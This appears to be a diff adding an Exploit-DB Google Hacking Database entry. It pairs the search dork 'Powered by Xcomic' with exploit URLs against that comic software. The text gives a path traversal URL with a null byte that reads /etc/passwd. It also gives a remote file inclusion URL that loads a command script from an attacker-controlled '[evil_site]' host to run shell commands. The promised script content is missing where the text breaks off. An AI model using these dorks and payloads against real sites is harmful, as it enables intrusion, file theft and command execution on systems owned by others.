@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/1096
+Category:         Vulnerable Files
+Published Date:   2005-09-08
+Author:           anonymous
+GoogleDork:       "Powered by Xcomic"
+Description:      "Powered by Xcomic"
+
+
+"Powered by xcomic"this is a recent exploit, you can retrieve any file on target systemby using "../" chars and null byte (%00), example:http://target/path_to_xcomic/initialize.php?xcomicRootPath=../../../../etc/passwd%00or launch commands:http://target/path_to_xcomic/initiailze.php?xcomicRootPath=http://[evil_site]/cmd.gif?command=ls%20-la%00where cmd.gif is a file like this:I have read an advisory copy here: http://forum.ccteam.ru/archive/index.php/t-57.html
